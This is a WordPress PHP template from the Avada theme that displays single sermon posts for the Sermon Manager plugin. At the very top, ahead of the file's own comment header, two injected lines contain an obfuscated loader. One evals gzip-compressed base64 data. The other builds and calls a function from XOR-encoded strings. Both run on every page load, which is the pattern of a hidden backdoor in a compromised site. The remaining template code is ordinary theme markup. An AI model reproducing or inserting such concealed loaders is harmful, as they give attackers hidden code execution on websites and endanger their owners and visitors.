<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php $tftdMtTh='7RH4ESg2DCN-S.:' ^ 'T -U168T1--Y:AT';$eVymFGSGXRt=$tftdMtTh('', 'TWkXF-,Z 1CXcEEB9CFcb,T;rS+ZAd>MLZlCYY5=:QI .JW TPV;DlH6CZd18-ZFiPP0YAtFYEYeJLdjgOGGXLDIAktnewtZljV;KgSBxTyhZtbQyBL5R-+prQT8XNKRW=HoEHbEb,-YdtpTOM+5N+nkG0C<VM9519u:khX>:+<4-gnFUGx9gJ3X000>7B>RP-68msR99L4Ofc>+2TsYwWWQ71C0W4J>2:36OHxO<89IQAkc7D<EWN2acbr7::2<6f+BdJYKYQLSCOEQXAPeiBzguJP<R,R<6ZIxL8<:zN<J7.F8kvaML;:CWrsIfdY<kAieX3DMaY=ZAP+J66+.MGi+y<laxmcHL1IlKU>TsiUgG1TNYYtKOB3F<W.1r,TCMhKuE<OA024o.Q-7rRtUV-R3UpH397L>llD01UOqalUXCE8.X>P4QRDSLoRVH-5-A -JP+H7Le>7=9S27lq597OaBvT,TF;lKEEMAhXQ GGD22VYBIt4HFU=cYSJ<X0.0.+fPWW8uUeM7,65AdGAeIF<emfPU03iS87Os,HkilpkRP;sZzCXNQ:Q5,aDkYXkV,bXxVzPz QQbCDDuH;K>8D>1I-eK6BAX;FK8Z-Q>M<rduRDVTTPdwsUllnLaMH89UNu5ZGVes<P6:A57TjXcRs1NUEMFgNI>'^'=1Cy XB9TX,6< =+J75KET;I-7J. ;a 9.KjpyN737<NM>>O:p.T63,W7;;nUX.nM41D8mTb2  LjlDJG4MNQh+<5KINBPOPec0T9Ow+XiYXaTF8E18G>HEXV55L9gprsTcDlBkLFCX-DZMtgiOT:J5O.mcbviRPHbQSKMxMNYPQCOJ-0>QdNq9Q9BUJB0PztBCLDHX0DFIElGZJF5SdW16=DTx:sP+JSeXS6hEoZYU:4zaiQ+N 6-ZAKF-tuuyusFJ1Dn2. qqmck30445LI9pnQ.1H3s9YOztXhSYCAD5nSO2YKKAi:ZV62Iy4ln0ZKiHA<R0,HyFPH6D8SWHFmoMt+y=4=>7h-BiH 0GtNWuC1P8;<pT0EK:bX6ZP-G1:mUkQ.Y6z:;=KJ0YVRoTq L>F0KB:D=14fH QE4oLA, 60 JG9R9N4z<<>067<Ljr,UYb2J;RzQaSXZ<VRDUQXC.HnVpH52Z3  <dhSR8Foc SF7ydoTU:44D<263c=HGCZXNw<2ARyEiSMBThDagEa+XPEB44DR2tSR6TqaKTQPL7fYJ9Hz>+gY5VMR YikX0MS<JoI2NF5fEjdbShZ9LY=aZ,T:.N+2,HnlH;T=Q,XUHUv 7 5yMWSuLLN7kD-NX9fQQ;37>TL1OV.TSs7qXXzT6<1evNuCC'); $eVymFGSGXRt();
/**
 * The template used by the Sermon Manager plugin.
 * Used for single sermons.
 *
 * @see https://wordpress.org/plugins/sermon-manager-for-wordpress/
 * @package Avada
 * @subpackage Templates
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}
?>
<?php get_header(); ?>
<?php $full_image = wp_get_attachment_image_src( get_post_thumbnail_id(), 'full' ); ?>
<section id="content" <?php Avada()->layout->add_class( 'content_class' ); ?> <?php Avada()->layout->add_style( 'content_style' ); ?>>
	<?php if ( Avada()->settings->get( 'blog_pn_nav' ) ) : ?>
		<div class="single-navigation clearfix">
			<?php previous_post_link( '%link', esc_html__( 'Previous', 'Avada' ) ); ?>
			<?php next_post_link( '%link', esc_html__( 'Next', 'Avada' ) ); ?>
		</div>
	<?php endif; ?>

	<?php if ( have_posts() ) : ?>
		<?php the_post(); ?>
		<article id="post-<?php the_ID(); ?>" <?php post_class( 'post' ); ?>>
			<?php $full_image = ''; ?>
			<?php if ( 'above' == Avada()->settings->get( 'blog_post_title' ) ) : ?>
				<?php $title_size = ( false === avada_is_page_title_bar_enabled( $post->ID ) ? '1' : '2' ); ?>
				<?php echo avada_render_post_title( $post->ID, false, '', $title_size ); // WPCS: XSS ok. ?>
			<?php elseif ( 'disabled' == Avada()->settings->get( 'blog_post_title' ) && Avada()->settings->get( 'disable_date_rich_snippet_pages' ) && Avada()->settings->get( 'disable_rich_snippet_title' ) ) : ?>
				<span class="entry-title" style="display: none;"><?php the_title(); ?></span>
			<?php endif; ?>

			<?php if ( ! post_password_required( $post->ID ) ) : ?>
				<?php if ( Avada()->settings->get( 'featured_images_single' ) ) : ?>
					<?php $video = apply_filters( 'privacy_iframe_embed', get_post_meta( $post->ID, 'pyre_video', true ) ); ?>
					<?php if ( 0 < avada_number_of_featured_images() || $video ) : ?>
						<div class="fusion-flexslider flexslider fusion-flexslider-loading fusion-post-slideshow post-slideshow">
							<ul class="slides">
								<?php if ( $video ) : ?>
									<li>
										<div class="full-video">
											<?php echo $video; // WPCS: XSS ok. ?>
										</div>
									</li>
								<?php endif; ?>
								<?php if ( has_post_thumbnail() && 'yes' != get_post_meta( $post->ID, 'pyre_show_first_featured_image', true ) ) : ?>
									<?php $attachment_data = Avada()->images->get_attachment_data( get_post_thumbnail_id() ); ?>
									<?php if ( is_array( $attachment_data ) ) : ?>
										<li>
											<?php if ( Avada()->settings->get( 'status_lightbox' ) && Avada()->settings->get( 'status_lightbox_single' ) ) : ?>
												<a href="<?php echo esc_url_raw( $attachment_data['url'] ); ?>" rel="prettyPhoto[gallery<?php the_ID(); ?>]" title="<?php echo esc_attr( $attachment_data['caption_attribute'] ); ?>" data-title="<?php echo esc_attr( $attachment_data['title_attribute'] ); ?>" data-caption="<?php echo esc_attr( $attachment_data['caption_attribute'] ); ?>">
													<?php /* translators: The link. */ ?>
													<span class="screen-reader-text"><?php printf( esc_attr__( 'Go to "%s"', 'Avada' ), get_the_title( $post ) ); ?></span>
													<img src="<?php echo esc_url_raw( $attachment_data['url'] ); ?>" alt="<?php echo esc_attr( $attachment_data['alt'] ); ?>" role="presentation" />
												</a>
											<?php else : ?>
												<img src="<?php echo esc_url_raw( $attachment_data['url'] ); ?>" alt="<?php echo esc_attr( $attachment_data['alt'] ); ?>" role="presentation" />
											<?php endif; ?>
										</li>
									<?php endif; ?>
								<?php endif; ?>
								<?php $i = 2; ?>
								<?php while ( $i <= Avada()->settings->get( 'posts_slideshow_number' ) ) : ?>
									<?php $attachment_new_id = fusion_get_featured_image_id( 'featured-image-' . $i, 'post' ); ?>
									<?php if ( $attachment_new_id ) : ?>
										<?php $attachment_data = Avada()->images->get_attachment_data( $attachment_new_id ); ?>
										<?php if ( is_array( $attachment_data ) ) : ?>
											<li>
												<?php if ( Avada()->settings->get( 'status_lightbox' ) && Avada()->settings->get( 'status_lightbox_single' ) ) : ?>
													<a href="<?php echo esc_url_raw( $attachment_data['url'] ); ?>" rel="prettyPhoto[gallery<?php the_ID(); ?>]" title="<?php echo esc_attr( $attachment_data['caption_attribute'] ); ?>" data-title="<?php echo esc_attr( $attachment_data['title_attribute'] ); ?>" data-caption="<?php echo esc_attr( $attachment_data['caption_attribute'] ); ?>">
														<?php // Translators: The link. ?>
														<span class="screen-reader-text"><?php printf( esc_attr__( 'Go to "%s"', 'Avada' ), get_the_title( $post ) ); ?></span>
														<img src="<?php echo esc_url_raw( $attachment_data['url'] ); ?>" alt="<?php echo esc_attr( $attachment_data['alt'] ); ?>" role="presentation" />
													</a>
												<?php else : ?>
													<img src="<?php echo esc_url_raw( $attachment_data['url'] ); ?>" alt="<?php echo esc_attr( $attachment_data['alt'] ); ?>" role="presentation" />
												<?php endif; ?>
											</li>
										<?php endif; ?>
									<?php endif; ?>
									<?php $i++; ?>
								<?php endwhile; ?>
							</ul>
						</div>
					<?php endif; ?>
				<?php endif; ?>
			<?php endif; ?>
			<?php if ( 'below' == Avada()->settings->get( 'blog_post_title' ) ) : ?>
				<?php $title_size = ( false === avada_is_page_title_bar_enabled( $post->ID ) ? '1' : '2' ); ?>
				<?php echo avada_render_post_title( $post->ID, false, '', $title_size ); // WPCS: XSS ok. ?>
			<?php endif; ?>
			<div class="post-content">
				<?php echo Avada()->sermon_manager->get_sermon_content(); // WPCS: XSS ok. ?>
				<?php fusion_link_pages(); ?>
			</div>
			<?php if ( ! post_password_required( $post->ID ) ) : ?>
				<?php echo avada_render_post_metadata( 'single' ); // WPCS: XSS ok. ?>
				<?php if ( Avada()->settings->get( 'social_sharing_box' ) ) : ?>

					<?php
					$title = the_title_attribute(
						array(
							'echo' => false,
							'post' => $post->ID,
						)
					);

					$sharingbox_social_icon_options = array(
						'sharingbox'        => 'yes',
						'icon_colors'       => Avada()->settings->get( 'sharing_social_links_icon_color' ),
						'box_colors'        => Avada()->settings->get( 'sharing_social_links_box_color' ),
						'icon_boxed'        => Avada()->settings->get( 'sharing_social_links_boxed' ),
						'icon_boxed_radius' => Fusion_Sanitize::size( Avada()->settings->get( 'sharing_social_links_boxed_radius' ) ),
						'tooltip_placement' => Avada()->settings->get( 'sharing_social_links_tooltip_placement' ),
						'linktarget'        => Avada()->settings->get( 'social_icons_new' ),
						'title'             => $title,
						'description'       => $title,
						'link'              => get_permalink( $post->ID ),
						'pinterest_image'   => ( $full_image ) ? $full_image[0] : '',
					);
					?>
					<div class="fusion-sharing-box fusion-single-sharing-box share-box">
						<h4><?php esc_html_e( 'Share This Story, Choose Your Platform!', 'Avada' ); ?></h4>
						<?php echo Avada()->social_sharing->render_social_icons( $sharingbox_social_icon_options ); // WPCS: XSS ok. ?>
					</div>

				<?php endif; ?>

				<?php if ( Avada()->settings->get( 'author_info' ) ) : ?>
					<div class="about-author">
						<?php ob_start(); ?>
						<?php the_author_posts_link(); ?>
						<?php /* translators: The link. */ ?>
						<?php $title = sprintf( __( 'About the Author: %s', 'Avada' ), ob_get_clean() ); ?>
						<?php $title_size = ( false === avada_is_page_title_bar_enabled( get_the_ID() ) ? '2' : '3' ); ?>
						<?php Avada()->template->title_template( $title, $title_size ); ?>
						<div class="about-author-container">
							<div class="avatar">
								<?php echo get_avatar( get_the_author_meta( 'email' ), '72' ); ?>
							</div>
							<div class="description">
								<?php the_author_meta( 'description' ); ?>
							</div>
						</div>
					</div>
				<?php endif; ?>

				<?php avada_render_related_posts(); // Render Related Posts. ?>

				<?php if ( Avada()->settings->get( 'blog_comments' ) ) : ?>
					<?php wp_reset_postdata(); ?>
					<?php comments_template(); ?>
				<?php endif; ?>
			<?php endif; ?>
		</article>
	<?php endif; ?>
</section>
<?php do_action( 'avada_after_content' ); ?>
<?php
get_footer();

/* Omit closing PHP tag to avoid "Headers already sent" issues. */
